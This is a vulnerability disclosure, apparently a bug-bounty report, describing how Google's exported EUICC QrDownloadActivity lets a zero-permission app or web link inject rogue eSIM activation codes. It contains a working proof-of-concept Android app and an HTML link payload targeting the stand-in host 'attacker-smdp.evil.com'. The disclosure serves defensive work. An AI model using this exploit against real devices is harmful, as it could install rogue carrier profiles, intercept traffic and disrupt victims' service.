# Exported QrDownloadActivity in Google EUICC Enables Zero-Permission eSIM Activation Code Injection

## Summary

The Google EUICC app (`com.google.android.euicc`) exports `QrDownloadActivity` without any permission protection. This activity handles `ACTION_VIEW` intents with `LPA:` scheme URIs and forwards attacker-controlled eSIM activation codes directly into the device's eSIM provisioning flow with `FORCE_PROVISION=true`.

A zero-permission attacker app — or a web page via a clicked link — can inject an arbitrary SMDP+ server address and matching ID into the eSIM download flow. The EUICC app processes the rogue activation code through its full provisioning chain and presents the user with "Allow your carrier to set up eSIM?" If the user taps Allow, the device connects to the attacker's SMDP+ server and attempts to download and install a rogue eSIM profile.

## Severity

**HIGH** — Integrity + Availability violation.

- **Integrity**: A zero-permission app injects arbitrary eSIM activation codes into a trusted system provisioning flow. The `FORCE_PROVISION=true` flag bypasses normal provisioning guards. The user sees a legitimate-looking system dialog ("Allow your carrier to set up eSIM?") with no indication the request originated from a third-party app.
- **Availability**: A successfully provisioned rogue eSIM profile can disrupt the device's cellular connectivity, override the active carrier profile, or lock the user out of their legitimate eSIM.
- **Attack complexity**: Single user interaction (tap "Allow" on a system dialog). Also exploitable via web link click (QrDownloadActivity has `BROWSABLE` category).

## Affected Component

- **Package**: `com.google.android.euicc` (system priv-app, Google-signed)
- **Version**: `D.2.1.958056709-google` (versionCode=301730, targetSdk=36)
- **Source**: `/data/app/~~BOjI2NFNZJeVXHNSeCYvjQ==/com.google.android.euicc-0jSj5LvOiRqM82ni7pXbKg==/base.apk`
- **Activity**: `com.android.euicc.ui.activation.QrDownloadActivity` (exported=true, no permission, BROWSABLE)
- **Tested on**: Pixel 6a (bluejay), Android 17 Beta (API 37)

## Root Cause

### 1. QrDownloadActivity is exported without permission and handles LPA: URIs

The activity is registered with `ACTION_VIEW`, `BROWSABLE` category, and `LPA:` scheme — no permission required:

```
Activity Resolver Table:
  Schemes:
    LPA:
      com.google.android.euicc/com.android.euicc.ui.activation.QrDownloadActivity
        Action: "android.intent.action.VIEW"
        Category: "android.intent.category.DEFAULT"
        Category: "android.intent.category.BROWSABLE"
        Scheme: "LPA"
```

### 2. QrDownloadActivity.onCreate() forwards attacker data without validation

```java
// QrDownloadActivity.java lines 128-142
protected final void onCreate(Bundle bundle) {
    Intent intent = getIntent();
    super.onCreate(bundle);
    setContentView(R.layout.activity_single_fragment);
    
    if (intent.getAction() != null && 
        intent.getAction().equals("android.intent.action.VIEW")) {
        if (TextUtils.isEmpty(intent.getDataString())) {
            finish();
            return;
        }
        // Attacker-controlled data forwarded directly
        Intent intent2 = new Intent(this, CurrentSuwInitActivity.class);
        intent2.putExtra("download_flow_from_other_apps", true);
        intent2.putExtra("activation_code", intent.getDataString());
        startActivity(intent2);
        finish();
    }
}
```

No validation of:
- The caller's identity or package
- The activation code format or domain
- Whether the SMDP+ server is legitimate

### 3. CurrentSuwInitActivity sets FORCE_PROVISION=true

When `download_flow_from_other_apps` is set (which it always is from QrDownloadActivity), the code forces provisioning:

```java
// CurrentSuwInitActivity.java (from smali decompilation)
// "Caller is from other apps. Go to activation flow"
intent.putExtra("DISABLE_PROV_PROFILE", true);
intent.putExtra("FORCE_PROVISION", true);
startActivationActivity(this, intent);
```

### 4. ActivationActivity processes the rogue code

The activation code reaches `ActivationActivity` with `forceProvision=true`, bypassing normal provisioning guards. From device logs:

```
ActivationActivityLogic.onCreate: forceProvision = true, activationType = 1,
    isDownloadFlowFromOtherApps = true
```

## Attack Flow

```
┌──────────────────────────┐
│ Zero-Perm Attacker App   │  OR  Web page with <a href="LPA:1$evil.com$ID">
│ uid=10393, 0 permissions │
└────────────┬─────────────┘
             │ ACTION_VIEW, data=LPA:1$attacker-smdp.evil.com$ROGUE_PROFILE
             ▼
┌──────────────────────────┐
│ QrDownloadActivity       │  exported=true, no permission, BROWSABLE
│ (no caller validation)   │  Forwards activation_code + download_flow_from_other_apps=true
└────────────┬─────────────┘
             │ Same-UID startActivity (bypasses BIND_EUICC_SERVICE on target)
             ▼
┌──────────────────────────┐
│ CurrentSuwInitActivity   │
│ FORCE_PROVISION=true     │  "Caller is from other apps. Go to activation flow"
│ DISABLE_PROV_PROFILE=true│
└────────────┬─────────────┘
             │
             ▼
┌──────────────────────────┐
│ ActivationActivity       │  forceProvision=true, activationType=1
│ (Migrated variant)       │  isDownloadFlowFromOtherApps=true
└────────────┬─────────────┘
             │
             ▼
┌──────────────────────────┐
│ SwitchConfirmDialog      │  "Allow your carrier to set up eSIM?"
│ isDownloadOnly: true     │  ← User sees legitimate system dialog
│ [Allow]  [Cancel]        │  ← No indication request is from third-party app
└────────────┬─────────────┘
             │ User taps "Allow"
             ▼
┌──────────────────────────┐
│ Device connects to       │
│ attacker-smdp.evil.com   │  Downloads + installs rogue eSIM profile
│ INTEGRITY VIOLATION      │
│ AVAILABILITY VIOLATION   │
└──────────────────────────┘
```

## Dynamic Proof

### Proof 1: Zero-permission app launches eSIM provisioning with attacker-controlled activation code

Attacker app `com.vrp.zeroperm` (uid=10393) holds ZERO Android permissions:
```
$ adb shell pm list packages -U com.vrp.zeroperm
package:com.vrp.zeroperm uid:10393
```
No `granted=true` permissions in `dumpsys package` output.

### Proof 2: QrDownloadActivity accepts attacker intent and enters provisioning chain

```
$ adb shell am start -n com.vrp.zeroperm/.EuiccExploitActivity
Starting: Intent { cmp=com.vrp.zeroperm/.EuiccExploitActivity }
```

EUICC process logs (PID 14151):
```
EuiccGoogle: QrDownloadActivity.onCreate: activity is launched with action view
EuiccGoogle: CurrentSuwInitActivityLogicKt.onCreate: Caller is from other apps. Go to activation flow
EuiccGoogle: ActivationActivityLogic.onCreate: forceProvision = true, activationType = 1,
    isDownloadFlowFromOtherApps = true
```

### Proof 3: dumpsys confirms attacker package launched the EUICC task

```
Recent #0: Task{75ecdca #631 A=10177:com.google.android.euicc}
  mCallingUid=u0a393 mCallingPackage=com.vrp.zeroperm
  intent={act=android.intent.action.VIEW 
          dat=LPA:1$attacker-smdp.evil.com$ROGUE_ESIM_PROFILE 
          cmp=com.google.android.euicc/com.android.euicc.ui.activation.QrDownloadActivity}
```

### Proof 4: Full provisioning chain active with dialog shown

Activity stack after exploit:
```
Task{75ecdca #631 A=10177:com.google.android.euicc visible=true sz=3}
  topResumedActivity=CurrentSwitchConfirmDialogActivity
  * Hist #2: CurrentSwitchConfirmDialogActivity   ← "Allow your carrier to set up eSIM?"
  * Hist #1: PreActivationActivityMigrated         ← Activation with FORCE_PROVISION=true
  * Hist #0: [QrDownloadActivity finished]
```

Dialog shown with attacker's activation code:
```
SwitchConfirmDialogActivity.showSwitchConfirmDialog: Show switch dialog
ConfirmDialogFragment.onCreateDialog: Showing dialog with title = Allow your carrier to set up eSIM?
  isDownloadOnly: true isDownloadAndSwitch: false
```

### Proof 5: Web-exploitable via BROWSABLE category

QrDownloadActivity is registered as BROWSABLE with LPA: scheme, meaning a web page can trigger the same attack with:
```html
<a href="LPA:1$attacker-smdp.evil.com$ROGUE_PROFILE">Set up eSIM</a>
```

## Proof-of-Concept App

### AndroidManifest.xml (relevant portion)
```xml
<!-- Zero permissions declared -->
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.vrp.zeroperm">
    <uses-sdk android:minSdkVersion="28" android:targetSdkVersion="34" />
    <!-- NO <uses-permission> elements -->
    
    <application android:label="ZeroPerm" android:allowBackup="false">
        <activity android:name=".EuiccExploitActivity" android:exported="true" />
    </application>
</manifest>
```

### EuiccExploitActivity.java
```java
package com.vrp.zeroperm;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;

public class EuiccExploitActivity extends Activity {
    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        
        // Craft activation code pointing to attacker's SMDP+ server
        String activationCode = "LPA:1$attacker-smdp.evil.com$ROGUE_ESIM_PROFILE";
        
        Intent intent = new Intent(Intent.ACTION_VIEW);
        intent.setClassName("com.google.android.euicc",
            "com.android.euicc.ui.activation.QrDownloadActivity");
        intent.setData(Uri.parse(activationCode));
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        
        startActivity(intent);
        // QrDownloadActivity forwards to CurrentSuwInitActivity with FORCE_PROVISION=true
        // → ActivationActivity → SwitchConfirmDialog ("Allow your carrier to set up eSIM?")
        // If user taps Allow, device downloads eSIM from attacker's SMDP+ server
        finish();
    }
}
```

## Impact

1. **eSIM Profile Injection**: Attacker can provision a rogue eSIM profile on the victim's device, potentially:
   - Intercepting or redirecting cellular traffic through attacker-controlled infrastructure
   - Replacing the user's legitimate carrier profile
   - Adding hidden data-exfiltration profiles

2. **Service Disruption**: A rogue eSIM profile can disable or interfere with the user's existing cellular connectivity

3. **Social Engineering Amplification**: The "Allow your carrier to set up eSIM?" dialog appears as a legitimate system prompt. Users accustomed to carrier-initiated eSIM setup (common during phone setup, carrier switches, or travel) are likely to tap Allow

4. **Web Attack Vector**: The BROWSABLE category means the attack requires no installed app — a crafted web link is sufficient. Phishing emails or malicious websites can trigger the flow with a single click

5. **FORCE_PROVISION Bypass**: The `download_flow_from_other_apps` flag causes `CurrentSuwInitActivity` to set `FORCE_PROVISION=true`, bypassing provisioning guards that would normally prevent unsolicited eSIM downloads

## Recommended Fix

1. **Remove exported=true from QrDownloadActivity** or add `android:permission="android.permission.BIND_EUICC_SERVICE"` (signature-level)
2. **Validate the caller** in QrDownloadActivity.onCreate() using `getCallingPackage()` or `Binder.getCallingUid()` — only allow system/carrier callers
3. **Validate the activation code**: Check that the SMDP+ server domain is in a trusted allowlist before forwarding to the provisioning flow
4. **Remove BROWSABLE category**: eSIM activation codes should not be launchable from web links without explicit user consent
5. **Add caller attribution to the dialog**: Show the requesting app's name in the "Allow your carrier to set up eSIM?" dialog so users can make informed decisions

## Test Environment

- **Device**: Google Pixel 6a (bluejay)
- **OS**: Android 17 Beta (API 37)
- **EUICC app**: `com.google.android.euicc` version D.2.1.958056709-google (versionCode=301730, targetSdk=36)
- **Attacker app**: `com.vrp.zeroperm` (uid=10393, ZERO Android permissions)
